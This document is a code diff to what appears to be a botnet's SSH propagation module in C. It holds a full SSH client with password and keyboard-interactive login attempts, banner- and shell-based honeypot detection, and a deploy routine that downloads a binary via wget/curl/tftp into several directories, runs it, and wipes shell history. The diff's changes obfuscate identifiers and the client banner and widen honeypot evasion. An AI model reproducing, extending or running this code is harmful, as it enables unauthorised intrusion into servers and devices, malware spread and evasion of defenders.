@@ -93,8 +93,8 @@ static const uint8_t dh1_p[DH1_SIZE] = {
     0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
 };
 
-/* Client banner */
-static const char *ssh_client_banner = "SSH-2.0-OpenSSH_9.7p1\r\n";
+/* Client banner — decrypted at runtime from config (_sB8nn3r) */
+#define ssh_client_banner ds_cstr(&_sB8nn3r)
 
 /* ======================================================================
    BIGNUM — minimal big-endian unsigned integer arithmetic
@@ -279,7 +279,7 @@ static void bn_modexp(bn_t *r, const bn_t *base, const bn_t *exp, const bn_t *m)
    HMAC-SHA-256
    ====================================================================== */
 
-/* hmac_sha256 is now in crypto.c — shared across all modules */
+/* _no3nm7v is now in crypto.c — shared across all modules */
 
 /* ======================================================================
    AES-128-CTR
@@ -294,9 +294,9 @@ static void aes128_expand_key(const uint8_t key[16], uint32_t rk[44]) {
     for (i = 4; i < 44; i++) {
         t = rk[i-1];
         if (i%4==0) {
-            t=((uint32_t)AES_SBOX[(t>>16)&0xFF]<<24)|((uint32_t)AES_SBOX[(t>>8)&0xFF]<<16)|
-              ((uint32_t)AES_SBOX[t&0xFF]<<8)|(uint32_t)AES_SBOX[(t>>24)&0xFF];
-            t ^= (uint32_t)AES_RCON[i/4] << 24;
+            t=((uint32_t)_aA7wX2u[(t>>16)&0xFF]<<24)|((uint32_t)_aA7wX2u[(t>>8)&0xFF]<<16)|
+              ((uint32_t)_aA7wX2u[t&0xFF]<<8)|(uint32_t)_aA7wX2u[(t>>24)&0xFF];
+            t ^= (uint32_t)_gt8ZM5S[i/4] << 24;
         }
         rk[i] = rk[i-4] ^ t;
     }
@@ -312,7 +312,7 @@ static void aes128_encrypt_block(const uint32_t rk[44], uint8_t block[16]) {
         s[i*4+2]^=(uint8_t)(rk[i]>>8); s[i*4+3]^=(uint8_t)(rk[i]);
     }
     for (round = 1; round <= 10; round++) {
-        for (i = 0; i < 16; i++) t[i] = AES_SBOX[s[i]];
+        for (i = 0; i < 16; i++) t[i] = _aA7wX2u[s[i]];
         tmp=t[1]; t[1]=t[5]; t[5]=t[9]; t[9]=t[13]; t[13]=tmp;
         tmp=t[2]; t[2]=t[10]; t[10]=tmp; tmp=t[6]; t[6]=t[14]; t[14]=tmp;
         tmp=t[15]; t[15]=t[11]; t[11]=t[7]; t[7]=t[3]; t[3]=tmp;
@@ -375,11 +375,11 @@ typedef struct {
 } aes256ctr_t;
 
 static uint32_t aes_sub_word(uint32_t w) {
-    return ((uint32_t)AES_SBOX[(w>>24)&0xFF]<<24)|((uint32_t)AES_SBOX[(w>>16)&0xFF]<<16)|
-           ((uint32_t)AES_SBOX[(w>>8)&0xFF]<<8)|(uint32_t)AES_SBOX[w&0xFF];
+    return ((uint32_t)_aA7wX2u[(w>>24)&0xFF]<<24)|((uint32_t)_aA7wX2u[(w>>16)&0xFF]<<16)|
+           ((uint32_t)_aA7wX2u[(w>>8)&0xFF]<<8)|(uint32_t)_aA7wX2u[w&0xFF];
 }
 
-static void aes256_expand_key(const uint8_t key[32], uint32_t rk[60]) {
+static void _vd6da5u(const uint8_t key[32], uint32_t rk[60]) {
     int i;
     for (i = 0; i < 8; i++)
         rk[i]=((uint32_t)key[i*4]<<24)|((uint32_t)key[i*4+1]<<16)|
@@ -388,7 +388,7 @@ static void aes256_expand_key(const uint8_t key[32], uint32_t rk[60]) {
         uint32_t t = rk[i-1];
         if (i%8==0) {
             t = aes_sub_word((t<<8)|(t>>24));
-            t ^= (uint32_t)AES_RCON[i/8] << 24;
+            t ^= (uint32_t)_gt8ZM5S[i/8] << 24;
         } else if (i%8==4) {
             t = aes_sub_word(t);
         }
@@ -396,7 +396,7 @@ static void aes256_expand_key(const uint8_t key[32], uint32_t rk[60]) {
     }
 }
 
-static void aes256_encrypt_block(const uint32_t rk[60], uint8_t block[16]) {
+static void _Mi6Kt2o(const uint32_t rk[60], uint8_t block[16]) {
     uint8_t s[16], t[16], tmp;
     int round, i, ki, cc;
     uint8_t a0,a1,a2,a3,x;
@@ -406,7 +406,7 @@ static void aes256_encrypt_block(const uint32_t rk[60], uint8_t block[16]) {
         s[i*4+2]^=(uint8_t)(rk[i]>>8); s[i*4+3]^=(uint8_t)(rk[i]);
     }
     for (round = 1; round <= 14; round++) {
-        for (i = 0; i < 16; i++) t[i] = AES_SBOX[s[i]];
+        for (i = 0; i < 16; i++) t[i] = _aA7wX2u[s[i]];
         tmp=t[1];t[1]=t[5];t[5]=t[9];t[9]=t[13];t[13]=tmp;
         tmp=t[2];t[2]=t[10];t[10]=tmp; tmp=t[6];t[6]=t[14];t[14]=tmp;
         tmp=t[15];t[15]=t[11];t[11]=t[7];t[7]=t[3];t[3]=tmp;
@@ -428,7 +428,7 @@ static void aes256_encrypt_block(const uint32_t rk[60], uint8_t block[16]) {
 }
 
 static void aes256ctr_init(aes256ctr_t *c, const uint8_t key[32], const uint8_t iv[16]) {
-    aes256_expand_key(key, c->rk);
+    _vd6da5u(key, c->rk);
     memcpy(c->ctr, iv, 16);
     c->ks_pos = 16;
 }
@@ -438,7 +438,7 @@ static void aes256ctr_crypt(aes256ctr_t *c, uint8_t *data, size_t len) {
     for (i = 0; i < len; i++) {
         if (c->ks_pos >= 16) {
             memcpy(c->ks, c->ctr, 16);
-            aes256_encrypt_block(c->rk, c->ks);
+            _Mi6Kt2o(c->rk, c->ks);
             { int j; for (j = 15; j >= 0; j--) if (++c->ctr[j] != 0) break; }
             c->ks_pos = 0;
         }
@@ -535,19 +535,19 @@ typedef struct {
     int          hash_len;  /* 32 for SHA-256, 20 for SHA-1 */
     uint32_t     next_chan;  /* monotonic channel ID for exec */
     char         banner[256]; /* server banner for honeypot detection */
-} ssh_conn_t;
+} _Rz8vk8z;
 
-static void ssh_encrypt(ssh_conn_t *c, uint8_t *data, size_t len) {
+static void ssh_encrypt(_Rz8vk8z *c, uint8_t *data, size_t len) {
     if (c->cipher_256) aes256ctr_crypt(&c->enc256, data, len);
     else aes128ctr_crypt(&c->enc128, data, len);
 }
-static void ssh_decrypt(ssh_conn_t *c, uint8_t *data, size_t len) {
+static void ssh_decrypt(_Rz8vk8z *c, uint8_t *data, size_t len) {
     if (c->cipher_256) aes256ctr_crypt(&c->dec256, data, len);
     else aes128ctr_crypt(&c->dec128, data, len);
 }
 
 /* Write raw bytes */
-static int ssh_write_raw(ssh_conn_t *c, const uint8_t *data, size_t len) {
+static int ssh_write_raw(_Rz8vk8z *c, const uint8_t *data, size_t len) {
     size_t off = 0;
     while (off < len) {
         ssize_t n = write(c->fd, data + off, len - off);
@@ -558,7 +558,7 @@ static int ssh_write_raw(ssh_conn_t *c, const uint8_t *data, size_t len) {
 }
 
 /* Read exactly n bytes with timeout */
-static int ssh_read_exact(ssh_conn_t *c, uint8_t *buf, size_t n) {
+static int ssh_read_exact(_Rz8vk8z *c, uint8_t *buf, size_t n) {
     size_t off = 0;
     struct pollfd pfd;
     pfd.fd = c->fd;
@@ -574,7 +574,7 @@ static int ssh_read_exact(ssh_conn_t *c, uint8_t *buf, size_t n) {
 }
 
 /* Send SSH packet */
-static int ssh_send_packet(ssh_conn_t *c, const uint8_t *payload, size_t plen) {
+static int ssh_send_packet(_Rz8vk8z *c, const uint8_t *payload, size_t plen) {
     uint8_t buf[SSH_MAX_PACKET + 64];
     size_t total, pad_len, i;
     uint32_t seq;
@@ -606,7 +606,7 @@ static int ssh_send_packet(ssh_conn_t *c, const uint8_t *payload, size_t plen) {
         if (c->hash_len == 20) {
             hmac_sha1(c->enc_mac, 20, macbuf, 4 + total, mac);
         } else {
-            hmac_sha256(c->enc_mac, 32, macbuf, 4 + total, mac);
+            _no3nm7v(c->enc_mac, 32, macbuf, 4 + total, mac);
         }
 
         ssh_encrypt(c, buf, total);
@@ -619,7 +619,7 @@ static int ssh_send_packet(ssh_conn_t *c, const uint8_t *payload, size_t plen) {
 }
 
 /* Receive SSH packet — returns payload length, payload starts at buf+0 */
-static int ssh_recv_packet(ssh_conn_t *c, uint8_t *payload, size_t max_payload) {
+static int _ay7CX5V(_Rz8vk8z *c, uint8_t *payload, size_t max_payload) {
     uint8_t hdr[4];
     uint32_t pkt_len;
     uint8_t *pkt;
@@ -664,7 +664,7 @@ static int ssh_recv_packet(ssh_conn_t *c, uint8_t *payload, size_t max_payload) 
    ====================================================================== */
 
 /* Build KEXINIT packet */
-static int ssh_build_kexinit(uint8_t *buf) {
+static int _dU6Up5e(uint8_t *buf) {
     int pos = 0;
     int i;
     const char *kex_alg = "curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1";
@@ -695,7 +695,7 @@ static int ssh_build_kexinit(uint8_t *buf) {
 }
 
 /* Check if algo appears as a complete entry in the comma-separated namelist */
-static int ssh_has_algo(const char *namelist, const char *algo) {
+static int _Cq8Hn7J(const char *namelist, const char *algo) {
     const char *p = namelist;
     int alen = (int)strlen(algo);
     while ((p = strstr(p, algo)) != NULL) {
@@ -722,15 +722,15 @@ static kex_algo_t ssh_select_kex(const uint8_t *server_kexinit, int len) {
     namelist[nlen] = '\0';
 
     /* Our preference order: curve25519 > group14-sha256 > group14-sha1 > group1-sha1 */
-    if (ssh_has_algo(namelist, "curve25519-sha256"))
+    if (_Cq8Hn7J(namelist, "curve25519-sha256"))
         return KEX_CURVE25519_SHA256;
-    if (ssh_has_algo(namelist, "curve25519-sha256@libssh.org"))
+    if (_Cq8Hn7J(namelist, "curve25519-sha256@libssh.org"))
         return KEX_CURVE25519_SHA256;
-    if (ssh_has_algo(namelist, "diffie-hellman-group14-sha256"))
+    if (_Cq8Hn7J(namelist, "diffie-hellman-group14-sha256"))
         return KEX_DH_GROUP14_SHA256;
-    if (ssh_has_algo(namelist, "diffie-hellman-group14-sha1"))
+    if (_Cq8Hn7J(namelist, "diffie-hellman-group14-sha1"))
         return KEX_DH_GROUP14_SHA1;
-    if (ssh_has_algo(namelist, "diffie-hellman-group1-sha1"))
+    if (_Cq8Hn7J(namelist, "diffie-hellman-group1-sha1"))
         return KEX_DH_GROUP1_SHA1;
 
     SSH_DBG("no common kex algorithm found in server list: %s", namelist);
@@ -738,7 +738,7 @@ static kex_algo_t ssh_select_kex(const uint8_t *server_kexinit, int len) {
 }
 
 /* Derive a session key (RFC 4253 §7.2) */
-static void ssh_derive_key(const uint8_t *K, int Klen,
+static void _kA7Bv2Y(const uint8_t *K, int Klen,
                            const uint8_t *H,
                            uint8_t letter,
                            const uint8_t *session_id,
@@ -767,15 +767,15 @@ static void ssh_derive_key(const uint8_t *K, int Klen,
             memcpy(out, hash, 20);
         }
     } else {
-        sha256_ctx_t ctx;
+        _BW4EK8x ctx;
         uint8_t hash[32];
-        sha256_init(&ctx);
-        sha256_update(&ctx, klen_be, 4);
-        sha256_update(&ctx, K, Klen);
-        sha256_update(&ctx, H, 32);
-        sha256_update(&ctx, &letter, 1);
-        sha256_update(&ctx, session_id, 32);
-        sha256_finish(&ctx, hash);
+        _tP5sQ3C(&ctx);
+        _iS7pL8N(&ctx, klen_be, 4);
+        _iS7pL8N(&ctx, K, Klen);
+        _iS7pL8N(&ctx, H, 32);
+        _iS7pL8N(&ctx, &letter, 1);
+        _iS7pL8N(&ctx, session_id, 32);
+        _Vd5Ph6z(&ctx, hash);
         if (out_len <= 32) {
             memcpy(out, hash, out_len);
         } else {
@@ -785,7 +785,7 @@ static void ssh_derive_key(const uint8_t *K, int Klen,
 }
 
 /* Full SSH handshake: banner + kexinit + DH + newkeys + service request */
-static int ssh_handshake(ssh_conn_t *c) {
+static int _ms4KB8R(_Rz8vk8z *c) {
     uint8_t sbanner[256];
     uint8_t payload[SSH_MAX_PACKET];
     uint8_t client_kexinit[512];
@@ -835,11 +835,11 @@ static int ssh_handshake(ssh_conn_t *c) {
     }
 
     /* 3. Send KEXINIT */
-    client_kexinit_len = ssh_build_kexinit(client_kexinit);
+    client_kexinit_len = _dU6Up5e(client_kexinit);
     if (ssh_send_packet(c, client_kexinit, client_kexinit_len) < 0) return -1;
 
     /* 4. Receive server KEXINIT */
-    server_kexinit_len = ssh_recv_packet(c, server_kexinit, sizeof(server_kexinit));
+    server_kexinit_len = _ay7CX5V(c, server_kexinit, sizeof(server_kexinit));
     if (server_kexinit_len < 0 || server_kexinit[0] != SSH_MSG_KEXINIT) return -1;
 
     /* 4b. Select kex algorithm based on server's offer */
@@ -855,7 +855,7 @@ static int ssh_handshake(ssh_conn_t *c) {
 
         /* Generate ephemeral keypair using existing crypto.c X25519 */
         urandom_bytes(c25519_priv, 32);
-        x25519_scalarmult_base(c25519_pub, c25519_priv);
+        _go6pR4p(c25519_pub, c25519_priv);
 
         /* Send KEX_ECDH_INIT: string Q_C (32 bytes) */
         {
@@ -873,7 +873,7 @@ static int ssh_handshake(ssh_conn_t *c) {
         }
 
         /* Receive KEX_ECDH_REPLY */
-        plen = ssh_recv_packet(c, payload, sizeof(payload));
+        plen = _ay7CX5V(c, payload, sizeof(payload));
         if (plen < 0 || payload[0] != SSH_MSG_KEXDH_REPLY) return -1;
 
         /* Parse: host_key(string) + Q_S(string, 32 bytes) + signature(string) */
@@ -899,7 +899,7 @@ static int ssh_handshake(ssh_conn_t *c) {
         }
 
         /* Compute shared secret */
-        x25519_scalarmult(c25519_shared, c25519_priv, c25519_server_pub);
+        _aw4Ma4u(c25519_shared, c25519_priv, c25519_server_pub);
 
         /* Encode shared secret as SSH mpint — raw byte order per OpenSSH convention */
         {
@@ -915,18 +915,18 @@ static int ssh_handshake(ssh_conn_t *c) {
 
         /* Compute exchange hash H (SHA-256) */
         {
-            sha256_ctx_t hctx;
+            _BW4EK8x hctx;
             uint8_t lbuf[4];
             uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;
 
-            sha256_init(&hctx);
+            _tP5sQ3C(&hctx);
 
 #define HASH_STR(data, len) do { \
     uint32_t _l = (uint32_t)(len); \
     lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
     lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
-    sha256_update(&hctx, lbuf, 4); \
-    sha256_update(&hctx, (const uint8_t *)(data), _l); \
+    _iS7pL8N(&hctx, lbuf, 4); \
+    _iS7pL8N(&hctx, (const uint8_t *)(data), _l); \
 } while(0)
 
             HASH_STR(ssh_client_banner, vc_len);
@@ -940,7 +940,7 @@ static int ssh_handshake(ssh_conn_t *c) {
 
 #undef HASH_STR
 
-            sha256_finish(&hctx, H);
+            _Vd5Ph6z(&hctx, H);
         }
     } else {
         /* ---- Classic DH KEX ---- */
@@ -982,7 +982,7 @@ static int ssh_handshake(ssh_conn_t *c) {
         }
 
         /* Receive KEXDH_REPLY */
-        plen = ssh_recv_packet(c, payload, sizeof(payload));
+        plen = _ay7CX5V(c, payload, sizeof(payload));
         if (plen < 0 || payload[0] != SSH_MSG_KEXDH_REPLY) return -1;
 
         /* Parse: host_key(string) + f(mpint) + signature(string) */
@@ -1050,18 +1050,18 @@ static int ssh_handshake(ssh_conn_t *c) {
 
             ssh_sha1_final(&hctx, H);
         } else {
-            sha256_ctx_t hctx;
+            _BW4EK8x hctx;
             uint8_t lbuf[4];
             uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;
 
-            sha256_init(&hctx);
+            _tP5sQ3C(&hctx);
 
 #define HASH_STRING(data, len) do { \
     uint32_t _l = (uint32_t)(len); \
     lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
     lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
-    sha256_update(&hctx, lbuf, 4); \
-    sha256_update(&hctx, (const uint8_t *)(data), _l); \
+    _iS7pL8N(&hctx, lbuf, 4); \
+    _iS7pL8N(&hctx, (const uint8_t *)(data), _l); \
 } while(0)
 
             HASH_STRING(ssh_client_banner, vc_len);
@@ -1075,7 +1075,7 @@ static int ssh_handshake(ssh_conn_t *c) {
 
 #undef HASH_STRING
 
-            sha256_finish(&hctx, H);
+            _Vd5Ph6z(&hctx, H);
         }
     }
     memcpy(c->session_id, H, c->hash_len);
@@ -1089,7 +1089,7 @@ static int ssh_handshake(ssh_conn_t *c) {
             coff += 4 + (int)nl;
         }
         { int off128 = coff;
-          c->cipher_256 = ssh_has_algo((const char *)(server_kexinit + coff + 4), "aes128-ctr") ? 0 : 1;
+          c->cipher_256 = _Cq8Hn7J((const char *)(server_kexinit + coff + 4), "aes128-ctr") ? 0 : 1;
           (void)off128; }
     }
 
@@ -1099,10 +1099,10 @@ static int ssh_handshake(ssh_conn_t *c) {
         int keylen = c->cipher_256 ? 32 : 16;
         uint8_t ekey[32], dkey[32];
 
-        ssh_derive_key(K_bytes, K_len, H, 'A', c->session_id, iv_c2s, 16, c->hash_len);
-        ssh_derive_key(K_bytes, K_len, H, 'B', c->session_id, iv_s2c, 16, c->hash_len);
-        ssh_derive_key(K_bytes, K_len, H, 'C', c->session_id, ekey, keylen, c->hash_len);
-        ssh_derive_key(K_bytes, K_len, H, 'D', c->session_id, dkey, keylen, c->hash_len);
+        _kA7Bv2Y(K_bytes, K_len, H, 'A', c->session_id, iv_c2s, 16, c->hash_len);
+        _kA7Bv2Y(K_bytes, K_len, H, 'B', c->session_id, iv_s2c, 16, c->hash_len);
+        _kA7Bv2Y(K_bytes, K_len, H, 'C', c->session_id, ekey, keylen, c->hash_len);
+        _kA7Bv2Y(K_bytes, K_len, H, 'D', c->session_id, dkey, keylen, c->hash_len);
 
         if (c->cipher_256) {
             aes256ctr_init(&c->enc256, ekey, iv_c2s);
@@ -1112,8 +1112,8 @@ static int ssh_handshake(ssh_conn_t *c) {
             aes128ctr_init(&c->dec128, dkey, iv_s2c);
         }
     }
-    ssh_derive_key(K_bytes, K_len, H, 'E', c->session_id, c->enc_mac, c->hash_len, c->hash_len);
-    ssh_derive_key(K_bytes, K_len, H, 'F', c->session_id, c->dec_mac, c->hash_len, c->hash_len);
+    _kA7Bv2Y(K_bytes, K_len, H, 'E', c->session_id, c->enc_mac, c->hash_len, c->hash_len);
+    _kA7Bv2Y(K_bytes, K_len, H, 'F', c->session_id, c->dec_mac, c->hash_len, c->hash_len);
 
     /* 9. Send NEWKEYS */
     {
@@ -1122,7 +1122,7 @@ static int ssh_handshake(ssh_conn_t *c) {
     }
 
     /* 10. Receive NEWKEYS */
-    plen = ssh_recv_packet(c, payload, sizeof(payload));
+    plen = _ay7CX5V(c, payload, sizeof(payload));
     if (plen < 0 || payload[0] != SSH_MSG_NEWKEYS) return -1;
 
     c->encrypted = 1;
@@ -1142,7 +1142,7 @@ static int ssh_handshake(ssh_conn_t *c) {
         if (ssh_send_packet(c, sreq, spos) < 0) return -1;
     }
 
-    plen = ssh_recv_packet(c, payload, sizeof(payload));
+    plen = _ay7CX5V(c, payload, sizeof(payload));
     if (plen < 0 || payload[0] != SSH_MSG_SERVICE_ACCEPT) return -1;
 
     SSH_DBG("handshake complete, encryption active");
@@ -1154,7 +1154,7 @@ static int ssh_handshake(ssh_conn_t *c) {
    ====================================================================== */
 
 /* Helper: build and send USERAUTH_REQUEST */
-static int ssh_send_auth_req(ssh_conn_t *c, const char *user,
+static int _LZ4Bb7E(_Rz8vk8z *c, const char *user,
                              const char *svc, const char *method,
                              const uint8_t *extra, int extra_len) {
     uint8_t pkt[512];
@@ -1172,16 +1172,16 @@ static int ssh_send_auth_req(ssh_conn_t *c, const char *user,
 }
 
 /* Keyboard-interactive auth fallback */
-static int ssh_auth_kbdint(ssh_conn_t *c, const char *user, const char *pass) {
+static int _yC5xh5B(_Rz8vk8z *c, const char *user, const char *pass) {
     uint8_t payload[SSH_MAX_PACKET];
     uint8_t resp[512];
     int rlen, rpos, tries;
     uint32_t plen=(uint32_t)strlen(pass);
 
-    { uint8_t extra[8]={0}; if (ssh_send_auth_req(c,user,"ssh-connection","keyboard-interactive",extra,8)<0) return -1; }
+    { uint8_t extra[8]={0}; if (_LZ4Bb7E(c,user,"ssh-connection","keyboard-interactive",extra,8)<0) return -1; }
 
     for (tries=0;tries<5;tries++) {
-        rlen=ssh_recv_packet(c,payload,sizeof(payload));
+        rlen=_ay7CX5V(c,payload,sizeof(payload));
         if (rlen<0) return -1;
         if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
         if (payload[0]==SSH_MSG_USERAUTH_FAILURE) return 0;
@@ -1205,7 +1205,7 @@ static int ssh_auth_kbdint(ssh_conn_t *c, const char *user, const char *pass) {
       if (ssh_send_packet(c,resp,p)<0) return -1; }
 
     for (tries=0;tries<5;tries++) {
-        rlen=ssh_recv_packet(c,payload,sizeof(payload));
+        rlen=_ay7CX5V(c,payload,sizeof(payload));
         if (rlen<0) return -1;
         if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
         if (payload[0]==SSH_MSG_USERAUTH_FAILURE) return 0;
@@ -1219,7 +1219,7 @@ static int ssh_auth_kbdint(ssh_conn_t *c, const char *user, const char *pass) {
 }
 
 /* Try password auth, fallback to keyboard-interactive. Returns: 1=success, 0=failure, -1=error */
-static int ssh_try_auth(ssh_conn_t *c, const char *user, const char *pass) {
+static int _CC2fp3F(_Rz8vk8z *c, const char *user, const char *pass) {
     uint8_t payload[SSH_MAX_PACKET];
     int rlen;
     uint32_t plen=(uint32_t)strlen(pass);
@@ -1229,13 +1229,13 @@ static int ssh_try_auth(ssh_conn_t *c, const char *user, const char *pass) {
       extra[ep++]=(uint8_t)(plen>>24);extra[ep++]=(uint8_t)(plen>>16);
       extra[ep++]=(uint8_t)(plen>>8);extra[ep++]=(uint8_t)plen;
       memcpy(extra+ep,pass,plen);ep+=(int)plen;
-      if (ssh_send_auth_req(c,user,"ssh-connection","password",extra,ep)<0) return -1; }
+      if (_LZ4Bb7E(c,user,"ssh-connection","password",extra,ep)<0) return -1; }
 
     /* Read packets, skipping any GLOBAL_REQUEST (80), EXT_INFO (7), DEBUG (4)
      * that OpenSSH 9.x sends between auth request and auth response */
     { int tries=0;
       while (tries < 10) {
-          rlen=ssh_recv_packet(c,payload,sizeof(payload));
+          rlen=_ay7CX5V(c,payload,sizeof(payload));
           if (rlen<0) return -1;
           if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
           if (payload[0]==SSH_MSG_USERAUTH_FAILURE) break;
@@ -1252,7 +1252,7 @@ static int ssh_try_auth(ssh_conn_t *c, const char *user, const char *pass) {
             int cplen=(int)mlen<255?(int)mlen:255;
             memcpy(methods,payload+5,(size_t)cplen); methods[cplen]='\0';
             if (strstr(methods,"keyboard-interactive"))
-                return ssh_auth_kbdint(c,user,pass);
+                return _yC5xh5B(c,user,pass);
         }
         return 0;
     }
@@ -1263,7 +1263,7 @@ static int ssh_try_auth(ssh_conn_t *c, const char *user, const char *pass) {
    SSH EXEC — open channel + run command (fire-and-forget)
    ====================================================================== */
 
-static int ssh_exec(ssh_conn_t *c, const char *cmd) {
+static int _nD6dS8V(_Rz8vk8z *c, const char *cmd) {
     uint8_t pkt[4096];
     uint8_t resp[SSH_MAX_PACKET];
     int pos, rlen;
@@ -1296,7 +1296,7 @@ static int ssh_exec(ssh_conn_t *c, const char *cmd) {
      * between auth and channel confirm — skip those. */
     { int tries = 0;
       while (tries < 10) {
-          rlen = ssh_recv_packet(c, resp, sizeof(resp));
+          rlen = _ay7CX5V(c, resp, sizeof(resp));
           if (rlen < 0) return -1;
           if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM) break;
           if (resp[0] == 92) { /* CHANNEL_OPEN_FAILURE */
@@ -1345,7 +1345,7 @@ static int ssh_exec(ssh_conn_t *c, const char *cmd) {
    ====================================================================== */
 
 /* Case-insensitive substring search */
-static int ssh_has_str(const char *haystack, const char *needle) {
+static int _CF4Xg7k(const char *haystack, const char *needle) {
     int nlen = (int)strlen(needle);
     while (*haystack) {
         if (strncasecmp(haystack, needle, (size_t)nlen) == 0)
@@ -1356,32 +1356,36 @@ static int ssh_has_str(const char *haystack, const char *needle) {
 }
 
 static const char *ssh_hp_sigs[] = {
-    "Cowrie", "Kippo", "HonSSH",
- "SSH-2.0-paramiko", "Twisted",
-    "OpenSSH_5.1p1 Debian-5",
+    /* Self-identifying honeypots */
+    "Cowrie", "Kippo", "HonSSH", "Glutton", "OpenCanary",
+    /* Known honeypot transports / libraries */
+    "SSH-2.0-paramiko", "SSH-2.0-libssh", "Twisted",
+    "russh_", "ssh2js", "SSH-2.0-Go", "SSH-2.0-Parks",
+    /* Vendor / appliance banners that are overwhelmingly honeypots */
+    "SSH-2.0-CISCO_WLC", "SSH-2.0-Server", "SSH-2.0-MocanaSSH",
+    /* NOTE: SSH-1.99 and OpenSSH_4.x removed — too many false positives
+       on real embedded/legacy devices. */
 };
 
 /* Passive honeypot check on SSH server banner. */
-static int ssh_is_honeypot(ssh_conn_t *c) {
+static int _mn4es3f(_Rz8vk8z *c) {
     int i;
     if (!c->banner[0]) return 0;
     for (i = 0; i < (int)(sizeof(ssh_hp_sigs)/sizeof(ssh_hp_sigs[0])); i++) {
-        if (ssh_has_str(c->banner, ssh_hp_sigs[i]))
+        if (_CF4Xg7k(c->banner, ssh_hp_sigs[i]))
             return 1;
     }
-    if (ssh_has_str(c->banner, "SSH-1.99-"))
-        return 1;
-    if (ssh_has_str(c->banner, "OpenSSH_4."))
-        return 1;
     return 0;
 }
 
 /* Deploy binary via wget/curl/tftp chain.
    Single command with || fallback across dirs so the remote shell handles it.
    Returns 1 if command sent, 0 on send failure. */
-static int ssh_deploy(ssh_conn_t *c, const char *url, int clean) {
+static int _Cb5rB3s(_Rz8vk8z *c, const char *url, int clean) {
     static const char *dirs[] = { "/tmp", "/var/run", "/dev/shm", "/root", "/" };
-    const char *tail = clean ? "; rm -f .d)" : ")";
+    const char *tail = clean
+        ? "; rm -f .d); history -c 2>/dev/null; > ~/.bash_history 2>/dev/null"
+        : "); history -c 2>/dev/null; > ~/.bash_history 2>/dev/null";
     char cmd[4096];
     int pos = 0;
     int d, first = 1;
@@ -1398,12 +1402,12 @@ static int ssh_deploy(ssh_conn_t *c, const char *url, int clean) {
         if (pos >= (int)sizeof(cmd) - 1) break;
     }
 
-    return ssh_exec(c, cmd) == 0 ? 1 : 0;
+    return _nD6dS8V(c, cmd) == 0 ? 1 : 0;
 }
 
 /* Execute command and read channel data response.
    Returns bytes read into out_buf, or -1 on error. */
-static int ssh_exec_read(ssh_conn_t *c, const char *cmd,
+static int _Rz2Pm4g(_Rz8vk8z *c, const char *cmd,
                          char *out_buf, int out_sz) {
     uint8_t pkt[1024];
     uint8_t resp[SSH_MAX_PACKET];
@@ -1434,7 +1438,7 @@ static int ssh_exec_read(ssh_conn_t *c, const char *cmd,
 
     { int t = 0;
       while (t < 10) {
-          rlen = ssh_recv_packet(c, resp, sizeof(resp));
+          rlen = _ay7CX5V(c, resp, sizeof(resp));
           if (rlen < 0) return -1;
           if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM) break;
           t++;
@@ -1466,7 +1470,7 @@ static int ssh_exec_read(ssh_conn_t *c, const char *cmd,
 
     { int tries = 0;
       while (tries < 15 && out_pos < out_sz - 1) {
-          rlen = ssh_recv_packet(c, resp, sizeof(resp));
+          rlen = _ay7CX5V(c, resp, sizeof(resp));
           if (rlen <= 0) break;
           if (resp[0] == 94 && rlen > 9) {
               uint32_t dlen = ((uint32_t)resp[5] << 24) | ((uint32_t)resp[6] << 16) |
@@ -1499,34 +1503,44 @@ static int ssh_exec_read(ssh_conn_t *c, const char *cmd,
 
 /* Active shell probe: graduated checks to verify real shell.
    Returns 1 = real shell, 0 = honeypot/fake. */
-static int ssh_probe_shell(ssh_conn_t *c) {
+static int _qP4pj8f(_Rz8vk8z *c) {
     char resp[1024];
     int n;
     int uname_ok = 0;
 
-    n = ssh_exec_read(c, "uname -a", resp, (int)sizeof(resp));
-    if (n > 2) {
-        if (ssh_has_str(resp, "cowrie") || ssh_has_str(resp, "kippo") ||
-            ssh_has_str(resp, "svr04"))
+    /* ch[0]: uname -a — must start with "Linux " to be credible */
+    n = _Rz2Pm4g(c, "uname -a", resp, (int)sizeof(resp));
+    if (n > 5 && strncmp(resp, "Linux ", 6) == 0) {
+        if (_CF4Xg7k(resp, "cowrie") || _CF4Xg7k(resp, "kippo") ||
+            _CF4Xg7k(resp, "svr04"))
             return 0;
         uname_ok = 1;
     }
 
-    n = ssh_exec_read(c,
-        "cat /proc/1/cmdline 2>/dev/null; echo ---;"
+    /* ch[1]: /proc/version (uname fallback) + honeypot dir listing */
+    n = _Rz2Pm4g(c,
+        "cat /proc/version 2>/dev/null; echo ---;"
+        " cat /proc/1/cmdline 2>/dev/null;"
         " ls /opt/cowrie /home/cowrie /home/kippo 2>/dev/null",
         resp, (int)sizeof(resp));
     if (n > 0) {
-        if (ssh_has_str(resp, "twisted") || ssh_has_str(resp, "cowrie") ||
-            ssh_has_str(resp, "/home/kippo"))
+        if (_CF4Xg7k(resp, "twisted") || _CF4Xg7k(resp, "cowrie") ||
+            _CF4Xg7k(resp, "/home/kippo"))
             return 0;
+        if (!uname_ok && _CF4Xg7k(resp, "Linux version"))
+            uname_ok = 1;
     }
 
     if (uname_ok)
         return 1;
 
-    n = ssh_exec_read(c, "/bin/busybox ECHOTEST", resp, (int)sizeof(resp));
-    if (n > 0 && ssh_has_str(resp, "applet not found"))
+    /* ch[2]: BusyBox ECHOTEST — multi-path for embedded targets */
+    n = _Rz2Pm4g(c,
+        "busybox ECHOTEST 2>/dev/null"
+        " || /bin/busybox ECHOTEST 2>/dev/null"
+        " || /usr/bin/busybox ECHOTEST 2>/dev/null",
+        resp, (int)sizeof(resp));
+    if (n > 0 && _CF4Xg7k(resp, "applet not found"))
         return 1;
 
     return 0;
